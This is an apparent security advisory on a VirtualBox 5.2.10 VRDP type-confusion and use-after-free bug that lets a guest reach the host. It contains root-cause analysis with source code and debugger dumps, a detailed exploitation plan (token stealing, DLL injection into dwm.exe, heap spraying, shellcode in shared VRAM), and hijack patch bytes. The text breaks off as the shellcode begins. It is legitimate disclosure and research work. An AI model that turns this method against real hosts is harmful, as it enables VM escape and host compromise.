**Vulnerability Summary**<br>
VirtualBox has a built-in RDP server which provides access to a guest machine. While the RDP client sees the guest OS, the RDP server runs on the host OS. Therefore, to view the guest OS the RDP client will make a connection to the host OS IP address rather than the guest OS IP address.
The VRDP server is composted of two parts: a high level, which is open source and residing in the VirtualBox source tree, and is responsible for the display management, and a low level shipped with Extension Pack which is the RDP server which conforms to RDP specifications.
The vulnerability is in the high level part. The vulnerability can be triggered when a connection to a Windows guest OS is closed, i.e. when we close the window of the RDP client application like rdesktop or Microsoft Remote Desktop.
While the crashing bug was reported to the VirtualBox tracker (https://www.virtualbox.org/ticket/16444), it was never considered a security vulnerability, and is not marked as one. This ticket is 15 months old at the time of writing this post and still marked as unresolved.
Prerequisites to exploit the vulnerability:

- VirtualBox Extension Pack installed on a host. It’s required to enable VRDP server
- VRDP server enabled
- 3D acceleration enabled
- Windows 10 as a guest
The vulnerability can probably be triggered from other guest OS due to the fact the the vulnerable code resides inside the Guest Additions driver.
Credit
An independent security researcher, Sergey Zelenyuk, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
VirtualBox version 5.2.10

**Vendor response**<br>
We reported this vulnerability to Oracle, the latest update from them is that they are still looking into it, while in fact the latest version of Oracle VirtualBox version 5.2.18 has silently introduced a patch without giving credit or mentioning of the vulnerability report. We do not know at this time if this fix was intentional (to fix our report) or done for some other reason, the change log does mention: “VRDP: fixed VM process termination on RDP client disconnect if 3D is enabled for the virtual machine”.
Vulnerability Analysis
General analysis
The vulnerability consists of two parts: a type confusion and a UAF. It’s not clear which of them is a bug and which one was the developer’s intention. We will discuss them separately later in subsection Root Cause Analysis.
Starting from the end, when RDP connection is being closed we gain control at the following place in /VirtualBox-5.2.8/src/VBox/Main/src-client/ConsoleVRDPServer.cpp file, line 1994:

```c++
/* static */ DECLCALLBACK(void) ConsoleVRDPServer::H3DORVisibleRegion(void *H3DORInstance, uint32_t cRects, const RTRECT *paRects)
{
    H3DORLOG(("H3DORVisibleRegion: ins %p %d\n", H3DORInstance, cRects));
    H3DORInstance *p = (H3DORInstance *)H3DORInstance;
    Assert(p);
    Assert(p->pThis);
    if (cRects == 0)
    {
        ...
    }
    else
    {
        p->pThis->m_interfaceImage.VRDEImageRegionSet (p->hImageBitmap,
                                                       cRects,
                                                       paRects);
    }
    H3DORLOG(("H3DORVisibleRegion: ins %p completed\n", H3DORInstance));
}
```
The corresponding assembly is in VBoxC.so library:

```assembly
.text:0000000000100DF0 ; void __fastcall ConsoleVRDPServer::H3DORVisibleRegion(void *H3DORInstance, uint32_t cRects, const void *paRects)
.text:0000000000100DF0 ConsoleVRDPServer__H3DORVisibleRegion proc near
.text:0000000000100DF0
.text:0000000000100DF0
.text:0000000000100DF0 var_10          = dword ptr -10h
.text:0000000000100DF0 var_C           = dword ptr -0Ch
.text:0000000000100DF0 var_8           = dword ptr -8
.text:0000000000100DF0 var_4           = dword ptr -4
.text:0000000000100DF0
.text:0000000000100DF0 ; __unwind {
.text:0000000000100DF0                 push    rbp
.text:0000000000100DF1                 mov     rax, rdi
.text:0000000000100DF4                 mov     rbp, rsp
.text:0000000000100DF7                 sub     rsp, 10h
.text:0000000000100DFB                 test    esi, esi
.text:0000000000100DFD                 jz      short loc_100E10
.text:0000000000100DFF                 mov     rax, [rax]
.text:0000000000100E02                 mov     rdi, [rdi+8]
.text:0000000000100E06                 call    qword ptr [rax+320h]
.text:0000000000100E0C                 leave
.text:0000000000100E0D                 retn
```

**Root Cause Analysis**<br>
Stopping at ConsoleVRDPServer::H3DORVisibleRegion we get a stack trace (here we use binaries with symbols compiled by us rather than those downloaded from VirtualBox website):

```assembly
#0  ConsoleVRDPServer::H3DORVisibleRegion (H3DORInstance=0x7f7db9817190, cRects=0x1, paRects=0x7f7db9ccad20) at /home/user/src/VirtualBox-5.2.8/src/VBox/Main/src-client/ConsoleVRDPServer.cpp:1996
#1  0x00007f7dcc1f0298 in CrFbDisplayVrdp::vrdpRegions (this=0x7f7db91fdf90, pFb=0x7f7dcc5173f8 <g_CrPresenter+4152>, hEntry=0x7f7dcd079dc0) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/display_vrdp.cpp:255
#2  0x00007f7dcc1efddd in CrFbDisplayVrdp::EntryRemoved (this=0x7f7db91fdf90, pFb=0x7f7dcc5173f8 <g_CrPresenter+4152>, hEntry=0x7f7dcd079dc0) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/display_vrdp.cpp:116
#3  0x00007f7dcc1f4e40 in CrFbDisplayBase::fbCleanupRemoveAllEntries (this=0x7f7db91fdf90) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/display_base.cpp:323
#4  0x00007f7dcc1f0024 in CrFbDisplayVrdp::fbCleanup (this=0x7f7db91fdf90) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/display_vrdp.cpp:193
#5  0x00007f7dcc1f4808 in CrFbDisplayBase::setFramebuffer (this=0x7f7db91fdf90, pFb=0x0) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/display_base.cpp:97
#6  0x00007f7dcc1f3ab1 in CrFbDisplayComposite::remove (this=0x7f7db92702b0, pDisplay=0x7f7db91fdf90, fCleanupDisplay=0x1) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/display_composite.cpp:67
#7  0x00007f7dcc1cf823 in crPMgrFbDisconnectDisplay (hFb=0x7f7dcc5173f8 <g_CrPresenter+4152>, pDp=0x7f7db91fdf90) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/server_presenter.cpp:2008
#8  0x00007f7dcc1d02cf in crPMgrFbDisconnectTargetDisplays (hFb=0x7f7dcc5173f8 <g_CrPresenter+4152>, pDpInfo=0x7f7dcc5163f0 <g_CrPresenter+48>, u32ModeRemove=0x4) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/server_presenter.cpp:2226
#9  0x00007f7dcc1d0787 in crPMgrModeModifyTarget (hFb=0x7f7dcc5173f8 <g_CrPresenter+4152>, iDisplay=0x0, u32ModeAdd=0x0, u32ModeRemove=0x4) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/server_presenter.cpp:2370
#10 0x00007f7dcc1d088f in crPMgrModeModify (hFb=0x7f7dcc5173f8 <g_CrPresenter+4152>, u32ModeAdd=0x0, u32ModeRemove=0x4) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/server_presenter.cpp:2396
#11 0x00007f7dcc1d0c81 in crPMgrModeModifyGlobal (u32ModeAdd=0x0, u32ModeRemove=0x4) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/server_presenter.cpp:2495
#12 0x00007f7dcc1d0d69 in CrPMgrModeVrdp (fEnable=0x0) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/server_presenter.cpp:2536
#13 0x00007f7dcc1e1bc8 in crVBoxServerSetOffscreenRendering (value=0x0) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:2734
#14 0x00007f7dcc1c9aca in svcHostCallPerform (u32Function=0x14, cParms=0x1, paParms=0x7f7df00fcb30) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp:1338
#15 0x00007f7dcc1ca071 in crVBoxServerHostCtl (pCtl=0x7f7df00fcb10, cbCtl=0x38) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserver/crservice.cpp:1438
#16 0x00007f7dcc1e2bc7 in crVBoxCrCmdHostCtl (hSvr=0x0, pCmd=0x7f7df00fcb10 "\001", cbCmd=0x38) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/server_main.c:3218
#17 0x00007f7db756add6 in vboxVDMACrHostCtlProcess (pVdma=0x555786209b10, pCmd=0x7f7dcd054f80, pfContinue=0x7f7df06ade17) at /home/user/src/VirtualBox-5.2.8/src/VBox/Devices/Graphics/DevVGA_VDMA.cpp:1376
#18 0x00007f7db756e391 in vboxVDMAWorkerThread (hThreadSelf=0x55578563bde0, pvUser=0x555786209b10) at /home/user/src/VirtualBox-5.2.8/src/VBox/Devices/Graphics/DevVGA_VDMA.cpp:2696
#19 0x00007f7e1481bb87 in rtThreadMain (pThread=0x55578563bde0, NativeThread=0x7f7df06ae700, pszThreadName=0x55578563c6c0 "VDMA") at /home/user/src/VirtualBox-5.2.8/src/VBox/Runtime/common/misc/thread.cpp:719
#20 0x00007f7e148e36af in rtThreadNativeMain (pvArgs=0x55578563bde0) at /home/user/src/VirtualBox-5.2.8/src/VBox/Runtime/r3/posix/thread-posix.cpp:327
#21 0x00007f7e10075494 in start_thread (arg=0x7f7df06ae700) at pthread_create.c:333
#22 0x00007f7e1222671f in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:105
```

Frames #22 – #14 are a generic handler of VDMA requests including calls to Shared OpenGL Service (Chromium Service) from a guest or a host. Frames #13 – #9 do preparations for the following creation or close of displays. (Display is a part of screen sent to a client. There may be several displays, one of them may represents an entire screen and another may be a little rectangle as an update for the screen.) At frames #8 – #7 we reach the point where a type confusion occurs.

**Type Confusion**<br>
Frame #7 is of the following function crPMgrFbDisconnectDisplay:

```c++
static int crPMgrFbDisconnectDisplay(HCR_FRAMEBUFFER hFb, CrFbDisplayBase *pDp)
{
    ...
    if (pDp->getContainer() == pFbInfo->pDpComposite)
    {
        pFbInfo->pDpComposite->remove(pDp);
        ...
        return VINF_SUCCESS;
    }
    WARN(("misconfig"));
    return VERR_INTERNAL_ERROR;
}
```
The second argument is an object of CrFbDisplayBase class. This class has the following subclasses: CrFbDisplayComposite, CrFbDisplayWindow, CrFbDisplayWindowRootVr, CrFbDisplayVrdp. In our case the type of pDp object is not CrFbDisplayBase but CrFbDisplayVrdp so its virtual table pointer references CrFbDisplayVrdp table. Please note this.
When pDp->getContainer() is called the call goes to the base class’ method getContainer because only CrFbDisplayBase implements it. The return value of this method is an object of type CrFbDisplayComposite. It’s strange because in our case the object is actually of type CrFbDisplayVrdp.
This allows to pass the check and to call CrFbDisplayComposite::remove() method (frame #6). This method calls CrFbDisplayBase::setFramebuffer, which has another interesting line:
```c++
int CrFbDisplayBase::setFramebuffer(struct CR_FRAMEBUFFER *pFb)
{
...
    if (mpFb)
    {
        rc = fbCleanup();
...
}
```
We can assume that the code was written with an intention to call fbCleanup() on an object of CrFbDisplayBase type, but the current object type is CrFbDisplayVrdp (remember the virtual table pointer). Hence, instead of call to CrFbDisplayBase::fbCleanup() we call the CrFbDisplayVrdp::fbCleanup() function.

**Use-After-Free**<br>
CrFbDisplayVrdp::fbCleanup() calls method fbCleanupRemoveAllEntries() which is implemented in the base class only so we’ve arrived to CrFbDisplayBase::fbCleanupRemoveAllEntries() which is the root of UAF and the entire vulnerability.
```c++
int CrFbDisplayBase::fbCleanupRemoveAllEntries()
{
    VBOXVR_SCR_COMPOSITOR_CONST_ITERATOR Iter;
    const VBOXVR_SCR_COMPOSITOR_ENTRY *pEntry;
    CrVrScrCompositorConstIterInit(CrFbGetCompositor(mpFb), &Iter);
    int rc = VINF_SUCCESS;
    while ((pEntry = CrVrScrCompositorConstIterNext(&Iter)) != NULL)
    {
        HCR_FRAMEBUFFER_ENTRY hEntry = CrFbEntryFromCompositorEntry(pEntry);
        rc = EntryRemoved(mpFb, hEntry);
        if (!RT_SUCCESS(rc))
        {
            WARN(("err"));
            break;
        }
        CrFbVisitCreatedEntries(mpFb, entriesDestroyCb, this);
    }
    return rc;
}
```

The loop iterates through all displays and calls EntryRemoved() for each display, where HCR_FRAMEBUFFER_ENTRY is a structure pointer represents a single display. Again, EntryRemoved() is called using CrFbDisplayVrdp virtual table rather than one of CrFbDisplayBase. Skipping an analysis of how the deletion is performed, let’s analyze what happens when CrFbVisitCreatedEntries is called.
```c++
void CrFbVisitCreatedEntries(HCR_FRAMEBUFFER hFb, PFNCR_FRAMEBUFFER_ENTRIES_VISITOR_CB pfnVisitorCb, void *pvContext)
{
    HCR_FRAMEBUFFER_ENTRY hEntry, hNext;
    RTListForEachSafe(&hFb->EntriesList, hEntry, hNext, CR_FRAMEBUFFER_ENTRY, Node)
    {
        if (hEntry->Flags.fCreateNotified)
        {
            if (!pfnVisitorCb(hFb, hEntry, pvContext))
                return;
        }
    }
}
```
The first argument is the container of all displays, the second is a callback called for each display, and the third is an argument for the callback. This procedure iterates through all the displays and calls the callback. Now look at the callback itself.
```c++
DECLCALLBACK(bool) CrFbDisplayBase::entriesDestroyCb(HCR_FRAMEBUFFER hFb, HCR_FRAMEBUFFER_ENTRY hEntry, void *pvContext)
{
    int rc = ((ICrFbDisplay*)(pvContext))->EntryDestroyed(hFb, hEntry);
    if (!RT_SUCCESS(rc))
    {
        WARN(("err"));
    }
    return true;
}
```
Not diving deeper, EntryDestroyed() is actually CrFbDisplayVrdp::EntryRemoved() which removes a display and frees its memory. Now you can see what’s wrong: in just one iteration of the loop of fbCleanupRemoveAllEntries() all displays are deleted and freed, and the second iteration will use already freed memory.

**Controlled Memory Analysis**<br>
Each display (HCR_FRAMEBUFFER_ENTRY) has a hash table where a value is a pointer to a structure describing coordinates of the display. For each display there is usually only one entry in the hash.

```c++
typedef struct CR_FRAMEBUFFER_ENTRY
{
    VBOXVR_SCR_COMPOSITOR_ENTRY Entry;
    RTLISTNODE Node;
    uint32_t cRefs;
    CR_FBENTRY_FLAGS Flags;
    CRHTABLE HTable;
} CR_FRAMEBUFFER_ENTRY;
```
The structure is H3DORInstance defined in ConsoleVRDPServer.cpp file mentioned at the beginning of the analysis.
```c++
typedef struct H3DORInstance
{
    ConsoleVRDPServer *pThis;
    HVRDEIMAGE hImageBitmap;
    int32_t x;
    int32_t y;
    uint32_t w;
    uint32_t h;
    bool fCreated;
    bool fFallback;
    bool fTopDown;
} H3DORInstance;
```
This is a “glue” between the high level of VRDP Server and the rest of VirtualBox. While the hash table holds just void pointers, when they are passed to ConsoleVRDPServer::* methods they are casted as H3DORInstance.
Back to the assembly, let’s look what memory is referenced in method ConsoleVRDPServer::H3DORVisibleRegion when it’s called during normal conditions.

```assembly
gef➤  x/5i $pc
=> 0x7fa018ec9dff:	mov    rax,QWORD PTR [rax]
   0x7fa018ec9e02:	mov    rdi,QWORD PTR [rdi+0x8]
   0x7fa018ec9e06:	call   QWORD PTR [rax+0x320]
   0x7fa018ec9e0c:	leave
   0x7fa018ec9e0d:	ret
gef➤  x/8gx $rax-0x10
0x7fa005b8e280:	0x0000000000000000	0x0000000000000035
0x7fa005b8e290:	0x00007fa010008070	0x00007fa005bf97f0
0x7fa005b8e2a0:	0x0000000000000000	0x0000029800000400
0x7fa005b8e2b0:	0x0000000000010101	0x0000000000000065
gef➤
```
$rax-0x10 is a malloc_chunk of size 0x30 and $rax points to a H3DORInstance. You can see “w” (width) field is 0x400 and “h” (height) is 0x298 – it’s the resolution of our RDP client display. Let’s break on this place when RDP session is being closed.
```assembly
gef➤  x/5i $pc
=> 0x7feffac2cdff:	mov    rax,QWORD PTR [rax]
   0x7feffac2ce02:	mov    rdi,QWORD PTR [rdi+0x8]
   0x7feffac2ce06:	call   QWORD PTR [rax+0x320]
   0x7feffac2ce0c:	leave
   0x7feffac2ce0d:	ret
gef➤  x/8gx $rax-0x10
0x7fefed472ba0:	0x0000000000000000	0x0000000000000035
0x7fefed472bb0:	0x00007fefed44c040	0x00007fefed44e630
0x7fefed472bc0:	0x0000000000000000	0x0000029800000400
0x7fefed472bd0:	0x0000000000010101	0x0000000000001015
gef➤  heap_for_ptr 0x7fefed472ba0
$2 = 0x7fefec000000
gef➤  heap bins fast 0x7fefec000000
Fastbins[idx=0, size=0x10] 0x00
...
Fastbins[idx=5, size=0x60]  ←  ...  ←  Chunk(addr=0x7fefed472bb0, size=0x34, flags=PREV_INUSE|NON_MAIN_ARENA) [incorrect fastbin_index]  ←  ...
...
```
Memory being referenced is a freed chunk stored in fastbins. The first two qwords at $rax was replaced with malloc_chunk* fd and malloc_chunk* bk, respectively. The code takes the first qword, dereferences it and again dereferences at 0x320 offset. We need to switch to binaries compiled by ourself with symbols and disabled optimization to show what’s really pointed by the first qword at this moment.
The next snippet is a list of displays and corresponding H3DORInstance-s at the first iteration of the loop, when no displays were freed yet.
```assembly
Thread 43 "VDMA" hit Breakpoint 4, CrFbDisplayBase::fbCleanupRemoveAllEntries (this=0x7fb79d69aec0) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/display_base.cpp:320
320	    while ((pEntry = CrVrScrCompositorConstIterNext(&Iter)) != NULL)
gef➤  pl
$1 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4e80
$2 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4d00
$3 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4dc0
$4 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4f40
$5 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4c40
$6 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4b80
$7 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4a00
$8 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4940
$9 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4ac0
gef➤  pli
$10 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4e80
$11 = "H3DORInstance:"
0x7fb79d130260:	0x00007fb79c0074b0	0x00007fb79cc71ef0
0x7fb79d130270:	0x0000000000000000	0x0000029b00000556
0x7fb79d130280:	0x0000000000010101
$12 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4d00
$13 = "H3DORInstance:"
0x7fb79cc729f0:	0x00007fb79c0074b0	0x00007fb79d06dd40
0x7fb79cc72a00:	0x0000000000000000	0x0000029b00000556
0x7fb79cc72a10:	0x0000000000010101
$14 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4dc0
$15 = "H3DORInstance:"
0x7fb79cc81690:	0x00007fb79c0074b0	0x00007fb79e1d7c50
0x7fb79cc816a0:	0x0000000000000000	0x0000029b00000556
0x7fb79cc816b0:	0x0000000000010101
$16 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4f40
$17 = "H3DORInstance:"
0x7fb79d66a310:	0x00007fb79c0074b0	0x00007fb79cc81390
0x7fb79d66a320:	0x0000000000000000	0x0000029b00000556
0x7fb79d66a330:	0x0000000000010101
$18 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4c40
$19 = "H3DORInstance:"
0x7fb79cc67450:	0x00007fb79c0074b0	0x00007fb79cc7ba00
0x7fb79cc67460:	0x0000000000000000	0x0000029b00000556
0x7fb79cc67470:	0x0003506100010101
$20 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4b80
$21 = "H3DORInstance:"
0x7fb79d12dc50:	0x00007fb79c0074b0	0x00007fb79d12f080
0x7fb79d12dc60:	0x0000000000000000	0x0000029b00000556
0x7fb79d12dc70:	0x0000000000010101
$22 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4a00
$23 = "H3DORInstance:"
0x7fb79d66a2b0:	0x00007fb79c0074b0	0x00007fb79d12f330
0x7fb79d66a2c0:	0x0000000000000000	0x0000029b00000556
0x7fb79d66a2d0:	0x0003506f00010101
$24 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4940
$25 = "H3DORInstance:"
0x7fb79cf983c0:	0x00007fb79c0074b0	0x00007fb79cc81400
0x7fb79cf983d0:	0x0000000000000000	0x0000029b00000556
0x7fb79cf983e0:	0x0000000000010101
$26 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4ac0
$27 = "H3DORInstance:"
0x7fb79d0a7430:	0x00007fb79c0074b0	0x00007fb79cc814f0
0x7fb79d0a7440:	0x0000000000000000	0x0000029b00000556
0x7fb79d0a7450:	0x0000000000010101
```
They look fine. Now lets pass one iteration to free all the displays and dump the display structures again.

```assembly
gef➤  c
Continuing.
[Thread 0x7fb791e05700 (LWP 3722) exited]
[Thread 0x7fb793fff700 (LWP 3723) exited]
Thread 43 "VDMA" hit Breakpoint 4, CrFbDisplayBase::fbCleanupRemoveAllEntries (this=0x7fb79d69aec0) at /home/user/src/VirtualBox-5.2.8/src/VBox/HostServices/SharedOpenGL/crserverlib/presenter/display_base.cpp:320
320	    while ((pEntry = CrVrScrCompositorConstIterNext(&Iter)) != NULL)
gef➤  pl
$28 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4e80
$29 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4d00
$30 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4dc0
$31 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4f40
$32 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4c40
$33 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4b80
$34 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4a00
$35 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4940
$36 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4ac0
gef➤  pli
$37 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4e80
$38 = "H3DORInstance:"
0x7fb79d130260:	0x00007fb79cc81460	0x00007fb79cc71ef0
0x7fb79d130270:	0x0000000000000000	0x0000029b00000556
0x7fb79d130280:	0x0000000000010101
$39 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4d00
$40 = "H3DORInstance:"
0x7fb79cc729f0:	0x00007fb79d130250	0x00007fb79d06dd40
0x7fb79cc72a00:	0x0000000000000000	0x0000029b00000556
0x7fb79cc72a10:	0x0000000000010101
$41 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4dc0
$42 = "H3DORInstance:"
0x7fb79cc81690:	0x00007fb79cc729e0	0x00007fb79e1d7c50
0x7fb79cc816a0:	0x0000000000000000	0x0000029b00000556
0x7fb79cc816b0:	0x0000000000010101
$43 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4f40
$44 = "H3DORInstance:"
0x7fb79d66a310:	0x00007fb79cc81680	0x00007fb79cc81390
0x7fb79d66a320:	0x0000000000000000	0x0000029b00000556
0x7fb79d66a330:	0x0000000000010101
$45 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4c40
$46 = "H3DORInstance:"
0x7fb79cc67450:	0x0000000000000000	0x00007fb79cc7ba00
0x7fb79cc67460:	0x0000000000000000	0x0000029b00000556
0x7fb79cc67470:	0x0003506100010101
$47 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4b80
$48 = "H3DORInstance:"
0x7fb79d12dc50:	0x00007fb79d66a300	0x00007fb79d12f080
0x7fb79d12dc60:	0x0000000000000000	0x0000029b00000556
0x7fb79d12dc70:	0x0000000000010101
$49 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4a00
$50 = "H3DORInstance:"
0x7fb79d66a2b0:	0x00007fb79cc67440	0x00007fb79d12f330
0x7fb79d66a2c0:	0x0000000000000000	0x0000029b00000556
0x7fb79d66a2d0:	0x0003506f00010101
$51 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4940
$52 = "H3DORInstance:"
0x7fb79cf983c0:	0x00007fb79d12dc40	0x00007fb79cc81400
0x7fb79cf983d0:	0x0000000000000000	0x0000029b00000556
0x7fb79cf983e0:	0x0000000000010101
$53 = (CR_FRAMEBUFFER_ENTRY *) 0x7fb7ac0f4ac0
$54 = "H3DORInstance:"
0x7fb79d0a7430:	0x00007fb79cf983b0	0x00007fb79cc814f0
0x7fb79d0a7440:	0x0000000000000000	0x0000029b00000556
0x7fb79d0a7450:	0x0000000000010101
```
We can see that the first qword of an entry (freed) is a pointer to a previous entry (also freed) minus 0x10, i.e. is a pointer to a malloc_chunk of a previous entry. Next, we continue to break on our crucial code which is occurred in the current iteration (remember we are using unoptimized binaries compiled by us at the moment).
```assembly
gef➤  b /home/user/src/VirtualBox/src/VBox/Main/src-client/ConsoleVRDPServer.cpp:1994
Breakpoint 5 at 0x7fb7af4eb017: file /home/user/src/VirtualBox-5.2.8/src/VBox/Main/src-client/ConsoleVRDPServer.cpp, line 1994.
gef➤  c
Continuing.
Thread 43 "VDMA" hit Breakpoint 5, ConsoleVRDPServer::H3DORVisibleRegion (H3DORInstance=0x7fb79cf983c0, cRects=0x1, paRects=0x7fb79cc7cab0) at /home/user/src/VirtualBox-5.2.8/src/VBox/Main/src-client/ConsoleVRDPServer.cpp:1994
1994	        p->pThis->m_interfaceImage.VRDEImageRegionSet (p->hImageBitmap,
gef➤  x/16i $pc
=> 0x7fb7af4eb017:	mov    rax,QWORD PTR [rbp-0x8]
   0x7fb7af4eb01b:	mov    rax,QWORD PTR [rax]
   0x7fb7af4eb01e:	mov    rax,QWORD PTR [rax+0x320]
   0x7fb7af4eb025:	mov    rdx,QWORD PTR [rbp-0x8]
   0x7fb7af4eb029:	mov    rcx,QWORD PTR [rdx+0x8]
   0x7fb7af4eb02d:	mov    rdx,QWORD PTR [rbp-0x38]
   0x7fb7af4eb031:	mov    esi,DWORD PTR [rbp-0x2c]
   0x7fb7af4eb034:	mov    rdi,rcx
   0x7fb7af4eb037:	call   rax
   0x7fb7af4eb039:	nop
   0x7fb7af4eb03a:	leave
   0x7fb7af4eb03b:	ret
gef➤  si
0x00007fb7af4eb01b	1994	        p->pThis->m_interfaceImage.VRDEImageRegionSet (p->hImageBitmap,
gef➤  x/8gx $rax-0x10
0x7fb79cf983b0:	0x0000000000000090	0x0000000000000035
0x7fb79cf983c0:	0x00007fb79d12dc40	0x00007fb700000000
0x7fb79cf983d0:	0x00007fb79cc7b8d0	0x00007f0100000000
0x7fb79cf983e0:	0x0000000000010101	0x00000000000000e5
```
As you can see, $rax holds a pointer to the second H3DORInstance from the bottom (0x7fb79cf983c0) and the first qword is a pointer to malloc_chunk of another freed H3DORInstance (0x7fb79d12dc50-0x10).
The main thing required to exploit this vulnerability is to be able to create an arbitrary number of H3DORInstance-s and to spray the heap around it to point [[$rax]+0x320] to an executable code we control.

**Exploit**<br>
The exploit contains three parts:

- Guest usermode executable launcher (vrdpexploit_launcher.exe)
- Guest usermode library to inject in dwm.exe process (hostid_hijacker.dll)
- Guest kernelmode driver (vrdpexploit.sys)
The exploit requires an elevated privileges to load the driver. In theory, on OSes other than Windows 10 the privileges may not be required.

**Exploitation Algorithm**<br>

- An attacker runs vrdpexploit_launcher.exe with elevated privileges.
- Stage 1: escalation
   - The launcher loads the driver.
   - The driver escalates privileges of the launcher process and dwm.exe process to SYSTEM.<br>
- Stage 2: hijacking
  - The launcher injects the library to dwm.exe process and hijacks an identifier required to successfully spray the host heap later.
  - The hijacked identifier is returned to the launcher.
- Stage 3: exploitation
  - The launcher suspends dwm.exe process to stop any guest-host communication related to a display updating. The display is “freezed”.
  - The driver connect to the Chromium service on the host via HGSMI (Host-Guest Shared Memory Interface).
  - The drivers sends a Chromium command to make an information leak and obtain host addresses.
  - The driver sends commands to the host to spray the heap.
  - The driver writes a shellcode to video memory. VRAM is shared between the guest and the host, on the host side a mapped VRAM region has RWX attributes set.
  - The driver reverts dwm.exe privileges back.
- Final stage
  - An attacker closes RDP connection to trigger an execution of the shellcode in VRAM on the host to spawn /usr/bin/xterm.
  - On the guest, the loader continues dwm.exe process and exits itself. The display is “unfreezed”, the VM continues to work.

**Details**<br>
> Stage 1: Escalation
The launcher (vrdpexploit_launcher.exe) loads the driver (vrdpexploit.sys) and sends IOCTL_ESCALATE request. The driver finds EPROCESS of System, the launcher, and dwm.exe processes. Then it saves an access token of dwm.exe process to revert it back after the exploitation, and replaces tokens of the launcher and dwm.exe with a token of System.<br>

> Stage 2: Hijacking
Reflective DLL Injection tool by Stephen Fewer is used to simplify an injection. When the library (hostid_hijacker.dll) is injected into dwm.exe it patches the following code to jump to a shellcode.

```c++
(/VirtualBox-5.2.8/src/VBox/Additions/WINNT/Graphics/Video/disp/wddm/VBoxDispD3D.cpp)
static HRESULT APIENTRY vboxWddmDDevPresent(HANDLE hDevice, CONST D3DDDIARG_PRESENT* pData)
{
...
#ifdef VBOX_WITH_CROGL
        if (pAdapter->u32VBox3DCaps & CR_VBOX_CAP_TEX_PRESENT)
        {
            IDirect3DSurface9 *pSrcSurfIf = NULL;
            hr = VBoxD3DIfSurfGet(pSrcRc, pData->SrcSubResourceIndex, &pSrcSurfIf);
...
```
The patch modifies the code right after VBoxD3DIfSurfGet call:
```c
BYTE gPatch[] =
"\xE8\x00\x00\x00\x00"                      // call $5
"\x58"                                      // pop rax
"\x48\x83\xE8\x05"                          // sub rax, 5
"\x50"                                      // push rax
"\x48\xB8\x41\x41\x41\x41\x41\x41\x41\x41"  // mov rax, 0x4141414141414141
"\x50"                                      // push rax
"\xC3";                                     // ret
```

At startup time, before patching, the library modifies 0x4141414141414141 with an address of the shellcode.
```assembly
PUBLIC Shellcode
EXTERN gHostId: DWORD
EXTERN RestoreBytes: PROC
.CODE
Shellcode PROC
	; We should preserve all the registers because it's not known
